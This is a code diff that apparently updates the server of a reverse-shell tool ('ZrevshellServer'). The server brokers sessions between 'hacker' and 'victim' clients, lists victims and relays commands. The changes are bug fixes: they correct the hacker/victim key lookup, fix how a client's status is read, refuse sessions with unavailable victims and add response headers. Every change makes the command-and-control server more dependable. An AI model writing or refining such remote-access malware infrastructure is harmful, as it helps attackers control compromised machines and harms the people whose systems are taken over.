@@ -1,9 +1,9 @@
 """ The reverse shell server and request handler. """
 
 # ---- imports
+import sys
 import threading as th
 import time as tm
-import sys
 from binascii import Error as b64decodeError
 from dataclasses import dataclass
 from functools import partial
@@ -247,7 +247,9 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # if an error happened our response will be None
         if result is None or len(result) == 0:
             return None
-        return result[0]
+        # Fix bug where we assume 0 is the return value
+        # but the reality was (0)
+        return result[0][0]
 
     def validate_session(
         self, client_id: str, client_type: int, requested_session: str
@@ -281,9 +283,10 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # and check the status of the other client in that session
         real_session = self.hacking_sessions.get_session(real_session_id)
 
-        dict_key = "victim_id"
+        # Fixed client mis match
+        dict_key = "hacker_id"
         if client_type == ut.ClientType.hacker:
-            dict_key = "hacker_id"
+            dict_key = "victim_id"
 
         spouse_client_id = real_session[dict_key]
         if spouse_client_id is None:
@@ -343,7 +346,10 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         victims = ut.encode_token(victims).encode()
 
         return sh.HandlerResponse(
-            True, HTTPStatus.OK, victims, {"content-length": str(len(victims))}
+            True,
+            HTTPStatus.OK,
+            victims,
+            {"content-length": str(len(victims)), "content-type": "application/json"},
         )
 
     def handle_cmd_exit_session(
@@ -495,7 +501,10 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         response = ut.encode_token(js.dumps(raw_response)).encode()
 
         return sh.HandlerResponse(
-            True, HTTPStatus.OK, response, {"content-length": str(len(response))}
+            True,
+            HTTPStatus.OK,
+            response,
+            {"content-length": str(len(response)), "content-type": "application/json"},
         )
 
     def handle_cmd_post_res(
@@ -591,9 +600,11 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # Check if the hacker himself is even in another session
         # so he is trying to create multiple sessions with multiple victims
-        if self.hacking_sessions.check_client_in_session(
-            victim_id
-        ) or self.hacking_sessions.check_client_in_session(client_id):
+        if (
+            self.hacking_sessions.check_client_in_session(victim_id)
+            or self.hacking_sessions.check_client_in_session(client_id)
+            or self.get_client_status(victim_id) == 0
+        ):
             # This means the victim is already in session with another hacker
             # so let's notify the hacker about it by sending a forbidden error
             return sh.HandlerResponse(False, HTTPStatus.FORBIDDEN)
@@ -606,7 +617,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # Finally report the OK message
         return sh.HandlerResponse(
-            True, HTTPStatus.OK, session_id, {"Content-Length": str(len(session_id))}
+            True, HTTPStatus.OK, session_id, {"content-length": str(len(session_id))}
         )
 
     def execute_command(
